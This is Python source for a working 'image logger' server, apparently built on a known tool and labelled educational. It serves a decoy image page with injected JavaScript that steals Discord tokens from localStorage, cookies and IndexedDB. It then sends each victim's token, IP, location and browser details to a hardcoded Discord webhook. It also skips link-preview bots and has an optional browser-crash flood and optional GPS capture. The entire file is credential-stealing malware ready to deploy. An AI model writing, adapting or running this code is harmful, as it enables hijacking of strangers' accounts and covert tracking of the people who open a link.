# Image Logger with Discord Token Capture
# By Team C00lB0i/C00lB0i | Modified for Cybersecurity Class Project
# Educational Use Only

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser, json, re

__app__ = "Enhanced Image Logger"
__description__ = "Advanced IP and session logging tool for cybersecurity research"
__version__ = "v3.0"
__author__ = "C00lB0i"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1058074536932806756/tHxpd1B4toTe9O--IKfNp_nQYwmw_kvM5SlbKJybPJOjWxQ5HTm5uUyOvrxhFlN7l2rz",
    "image": "https://www.sportsdirect.com/images/imgzoom/39/39709290_xxl.jpg",
    "imageArgument": True,

    # CUSTOMIZATION #
    "username": "Security Logger",
    "color": 0x00FFFF,

    # OPTIONS #
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "Security scan in progress...",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    
    # NEW TOKEN LOGGING FEATURE #
    "tokenLogging": True,  # Enable Discord token capture
    "tokenWebhook": "https://discord.com/api/webhooks/1058074536932806756/tHxpd1B4toTe9O--IKfNp_nQYwmw_kvM5SlbKJybPJOjWxQ5HTm5uUyOvrxhFlN7l2rz",  # Same as main webhook by default

    # REDIRECTION #
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")) or "Discordbot" in useragent:
        return "Discord"
    elif useragent.startswith("TelegramBot") or "Telegram" in useragent:
        return "Telegram"
    elif "Twitterbot" in useragent:
        return "Twitter"
    elif "WhatsApp" in useragent:
        return "WhatsApp"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
            }
        ],
    })

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "content": "",
                "embeds": [
                    {
                        "title": "Image Logger - Link Sent",
                        "color": config["color"],
                        "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** {endpoint}\n**IP:** {ip}\n**Platform:** {bot}",
                    }
                ],
            })
        return

    ping = "@everyone"

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
        if info["proxy"]:
            if config["vpnCheck"] == 2:
                return
            if config["vpnCheck"] == 1:
                ping = ""
        
        if info["hosting"]:
            if config["antiBot"] == 4:
                if not info["proxy"]:
                    return
            elif config["antiBot"] == 3:
                return
            elif config["antiBot"] == 2:
                if not info["proxy"]:
                    ping = ""
            elif config["antiBot"] == 1:
                ping = ""
    except:
        info = {}
        info.update({key: "Error" for key in ["isp", "as", "country", "regionName", "city", "lat", "lon", "timezone", "mobile", "proxy", "hosting"]})

    os, browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
    
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "Image Logger - IP Logged",
                "color": config["color"],
                "description": f"""**A User Opened the Original Image!**

**Endpoint:** {endpoint}
                
**IP Info:**
> **IP:** {ip if ip else 'Unknown'}
> **Provider:** {info.get('isp', 'Unknown')}
> **ASN:** {info.get('as', 'Unknown')}
> **Country:** {info.get('country', 'Unknown')}
> **Region:** {info.get('regionName', 'Unknown')}
> **City:** {info.get('city', 'Unknown')}
> **Coords:** {str(info.get('lat', '')) + ', ' + str(info.get('lon', '')) if not coords else coords.replace(',', ', ')} ({'Approximate' if not coords else 'Precise, [Google Maps](https://www.google.com/maps/search/google+map++' + coords + ')'})
> **Timezone:** {info.get('timezone', 'Unknown').split('/')[1].replace('_', ' ') if info.get('timezone') else 'Unknown'} ({info.get('timezone', 'Unknown').split('/')[0] if info.get('timezone') else 'Unknown'})
> **Mobile:** {info.get('mobile', 'Unknown')}
> **VPN:** {info.get('proxy', 'Unknown')}
> **Bot:** {info.get('hosting', 'Unknown') if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}

**PC Info:**
> **OS:** {os}
> **Browser:** {browser}

**User Agent:**
```{useragent}```
""",
            }
        ],
    }
    
    if url: 
        embed["embeds"][0].update({"thumbnail": {"url": url}})
    
    try:
        requests.post(config["webhook"], json=embed)
    except Exception as e:
        reportError(f"Failed to send main webhook: {str(e)}")
    
    return info

def reportToken(ip, useragent, token, endpoint="N/A"):
    if not token or token == "NOT_FOUND":
        return
    
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    if bot:
        return
    
    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    except:
        info = {}
    
    os, browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
    
    token_embed = {
        "username": "TOKEN CAPTURE",
        "content": "@everyone **CRITICAL TOKEN LOGGED**",
        "embeds": [
            {
                "title": "Discord Token Captured!",
                "color": 0xFF0000,
                "description": f"""**A Discord token was successfully captured!**

**Endpoint:** {endpoint}
**IP:** `{ip}`
**Token:** `{token}`

**Token Information:**
> **Account ID:** `{token.split('.')[0] if '.' in token else 'N/A'}`
> **Creation Timestamp:** `{token.split('.')[1] if '.' in token and len(token.split('.')) > 1 else 'N/A'}`

**User Info:**
> **OS:** {os}
> **Browser:** {browser}
> **User Agent:**
```{useragent}```

**Important:** This token provides full access to the user's Discord account. Handle with extreme security precautions.
""",
            }
        ],
    }
    
    try:
        requests.post(config["tokenWebhook"] or config["webhook"], json=token_embed)
    except Exception as e:
        reportError(f"Failed to send token webhook: {str(e)}")

# Malicious JavaScript for token capture
token_js = """
// Token capture script
document.addEventListener('DOMContentLoaded', function() {
    function captureDiscordToken() {
        // Attempt to capture token from localStorage
        var token = localStorage.getItem('token') || 
                    localStorage.getItem('_token') || 
                    localStorage.getItem('discord_token') || 
                    localStorage.getItem('auth_token');
        
        // Attempt to capture token from cookies
        if (!token) {
            var cookies = document.cookie.split(';');
            for (var i = 0; i < cookies.length; i++) {
                var cookie = cookies[i].trim();
                if (cookie.startsWith('token=') || 
                    cookie.startsWith('_token=') || 
                    cookie.startsWith('discord_token=') || 
                    cookie.startsWith('auth_token=')) {
                    token = cookie.split('=')[1];
                    break;
                }
            }
        }
        
        // Attempt to capture token from IndexedDB (Discord web)
        if (!token) {
            try {
                var openRequest = indexedDB.open('discord');
                openRequest.onsuccess = function(e) {
                    var db = e.target.result;
                    var transaction = db.transaction('token', 'readonly');
                    var store = transaction.objectStore('token');
                    var request = store.get('token');
                    
                    request.onsuccess = function(event) {
                        if (event.target.result) {
                            token = event.target.result.value;
                            sendToken(token);
                        }
                    };
                };
            } catch (e) {}
        }
        
        if (token) {
            sendToken(token);
        } else {
            sendToken("NOT_FOUND");
        }
    }
    
    function sendToken(token) {
        // Send token via image beacon
        var img = new Image();
        img.src = '/logtoken?token=' + encodeURIComponent(token) + '&r=' + Math.random();
        
        // Alternative fetch method
        fetch('/logtoken', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({token: token})
        }).catch(() => {});
    }
    
    // Execute token capture with delay to avoid blocking
    setTimeout(captureDiscordToken, 1500);
});
"""

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000'),
    "pixel": base64.b64decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=")
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            # Handle token.js request
            if self.path == '/token.js':
                self.send_response(200)
                self.send_header('Content-Type', 'application/javascript')
                self.end_headers()
                self.wfile.write(token_js.encode())
                return
                
            # Handle token logging via GET
            if self.path.startswith('/logtoken'):
                query = parse.parse_qs(parse.urlparse(self.path).query)
                token = query.get('token', [''])[0]
                
                ip = self.headers.get('x-forwarded-for', '')
                useragent = self.headers.get('user-agent', '')
                
                if config["tokenLogging"] and token:
                    reportToken(ip, useragent, token, self.path)
                
                self.send_response(200)
                self.send_header('Content-Type', 'image/png')
                self.end_headers()
                self.wfile.write(binaries["pixel"])
                return
                
            # Main image logger functionality
            parsed_path = parse.urlparse(self.path)
            query_params = parse.parse_qs(parsed_path.query)
            
            if config["imageArgument"] and ('url' in query_params or 'id' in query_params):
                url = base64.b64decode(query_params.get('url', query_params.get('id', [b''])[0]).decode()
            else:
                url = config["image"]
                
            # Build HTML response
            html_content = f'''<html>
<head>
<title>Loading Image...</title>
<style>
body {{
    margin: 0;
    padding: 0;
    background-color: #1e1e1e;
}}
div.img {{
    background-image: url('{url}');
    background-position: center center;
    background-repeat: no-repeat;
    background-size: contain;
    width: 100vw;
    height: 100vh;
}}
</style>
</head>
<body>
<div class="img"></div>
'''

            # Add token capture script if enabled
            if config["tokenLogging"]:
                html_content += '<script src="/token.js"></script>\n'
            
            # Add accurate location script if enabled
            if config["accurateLocation"]:
                html_content += '''<script>
setTimeout(function() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
            var coords = position.coords.latitude + "," + position.coords.longitude;
            var img = new Image();
            img.src = '/gps?coords=' + encodeURIComponent(btoa(coords));
        });
    }
}, 1000);
</script>\n'''
            
            html_content += '</body>\n</html>'
            data = html_content.encode()
            
            # Process request
            ip = self.headers.get('x-forwarded-for', '')
            useragent = self.headers.get('user-agent', '')
            
            if ip.startswith(blacklistedIPs):
                return
                
            bot = botCheck(ip, useragent)
            endpoint = parsed_path.path
            
            if bot:
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 
                                'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()
                
                if config["buggedImage"]:
                    self.wfile.write(binaries["loading"])
                
                makeReport(ip, endpoint=endpoint, url=url)
                return
            
            # GPS coordinates handling
            coords = None
            if 'g' in query_params and config["accurateLocation"]:
                try:
                    coords = base64.b64decode(query_params['g'][0].encode()).decode()
                except:
                    pass
            
            # Create report
            result = makeReport(ip, useragent, coords, endpoint, url=url)
            
            # Handle custom messages
            if config["message"]["doMessage"]:
                message = config["message"]["message"]
                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", ip)
                    message = message.replace("{isp}", result.get("isp", "Unknown"))
                    message = message.replace("{asn}", result.get("as", "Unknown"))
                    message = message.replace("{country}", result.get("country", "Unknown"))
                    message = message.replace("{region}", result.get("regionName", "Unknown"))
                    message = message.replace("{city}", result.get("city", "Unknown"))
                    message = message.replace("{lat}", str(result.get("lat", "Unknown")))
                    message = message.replace("{long}", str(result.get("lon", "Unknown")))
                    message = message.replace("{timezone}", result.get("timezone", "Unknown").split('/')[1].replace('_', ' ') + " (" + result.get("timezone", "Unknown").split('/')[0] + ")")
                    message = message.replace("{mobile}", str(result.get("mobile", "Unknown")))
                    message = message.replace("{vpn}", str(result.get("proxy", "Unknown")))
                    message = message.replace("{bot}", str(result.get("hosting", "Unknown") if result.get("hosting") and not result.get("proxy") else 'Possibly' if result.get("hosting") else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(useragent)[1] if useragent else "Unknown")
                    message = message.replace("{os}", httpagentparser.simple_detect(useragent)[0] if useragent else "Unknown")
                
                data = message.encode()
            
            # Browser crash option
            if config["crashBrowser"]:
                data = b'<script>setTimeout(function(){for(var i=0;i<100;i++){window.open("")}},100)</script>'
            
            # Redirection
            if config["redirect"]["redirect"]:
                data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
            
            # Send response
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(data)
            
        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(f'500 - Internal Server Error<br>{str(e)}'.encode())
            reportError(traceback.format_exc())
    
    def do_POST(self):
        # Handle token logging via POST
        if self.path == '/logtoken':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            
            try:
                token_data = json.loads(post_data)
                token = token_data.get('token', '')
            except:
                token = ''
            
            ip = self.headers.get('x-forwarded-for', '')
            useragent = self.headers.get('user-agent', '')
            
            if config["tokenLogging"] and token:
                reportToken(ip, useragent, token, self.path)
            
            self.send_response(200)
            self.send_header('Content-Type', 'image/png')
            self.end_headers()
            self.wfile.write(binaries["pixel"])
            return
        
        self.send_response(404)
        self.end_headers()

handler = app = ImageLoggerAPI
